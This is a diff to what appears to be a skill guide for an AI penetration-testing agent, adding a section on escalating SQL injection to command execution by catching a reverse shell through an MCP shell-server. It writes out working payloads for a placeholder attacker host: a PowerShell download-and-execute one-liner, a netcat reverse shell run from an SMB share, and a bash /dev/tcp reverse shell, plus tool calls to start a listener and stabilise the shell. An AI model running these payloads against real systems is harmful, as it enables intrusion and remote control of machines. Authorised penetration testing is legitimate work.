@@ -294,6 +294,34 @@ sqlmap -r register.txt -p username --second-req profile-request.txt
 
 ## Step 6: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When OS command execution is confirmed, **prefer catching a reverse shell via
+the MCP shell-server** over continuing to execute commands through
+xp_cmdshell, COPY TO PROGRAM, or UDF.
+
+1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
+2. Send a reverse shell payload through the SQL command execution method:
+
+   **MSSQL (xp_cmdshell):**
+   ```powershell
+   powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/rev.ps1')"
+   ```
+   Or via SMB:
+   ```cmd
+   \\ATTACKER\share\nc.exe -e cmd.exe ATTACKER PORT
+   ```
+
+   **PostgreSQL (COPY TO PROGRAM) / MySQL (UDF):**
+   ```bash
+   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Use `send_command()` for all subsequent commands
+
+If the target lacks outbound connectivity, continue with inline command
+execution and note the limitation in state.md.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
